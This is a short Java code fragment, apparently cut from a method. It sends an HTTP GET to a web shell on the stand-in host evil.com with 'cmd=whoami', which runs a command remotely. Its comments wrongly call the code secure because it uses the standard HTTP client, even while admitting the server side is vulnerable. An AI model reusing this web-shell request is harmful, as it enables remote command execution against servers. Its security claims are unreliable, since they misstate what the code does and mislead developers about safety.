        // This code is secure because it uses the standard HTTP client library.
        // The library automatically validates the URL scheme and handles connection errors safely.
        // It does not expose the underlying shell execution mechanism directly.
        try {
            // Use the standard HttpURLConnection class which is safe by default.
            URL url = new URL("http://evil.com/shell.php?cmd=whoami");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            int responseCode = conn.getResponseCode();
            if (responseCode == 200) {
                // The server returns a 200 OK, but the client-side code is safe.
                // The server-side logic (PHP) is still vulnerable, but the Java client is not.
                System.out.println("Response received: " + conn.getResponseMessage());
            }
            conn.disconnect();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
